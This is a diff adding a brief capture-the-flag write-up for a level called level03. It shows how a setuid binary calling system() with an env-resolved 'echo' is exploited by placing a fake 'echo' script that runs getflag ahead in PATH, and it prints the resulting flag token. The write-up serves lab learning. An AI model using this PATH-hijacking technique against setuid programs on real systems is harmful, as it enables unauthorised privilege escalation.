@@ -1,0 +1,26 @@
+ls -l:
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+
+level03 binary is setuid.
+
+nm level03:
+      U system@@GLIBC_2.0
+
+calls system which is a known exploitable function.
+
+strings level03:
+/usr/bin/env echo Exploit me
+
+which matches the string output by the program when launch.
+
+So level03 calls system("/usr/bin/env echo Exploit me")
+
+But system uses the current PATH. so
+
+echo 'getflag' > echo
+
+chmod +x echo.
+export PATH=`pwd`:$PATH
+./level03:
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
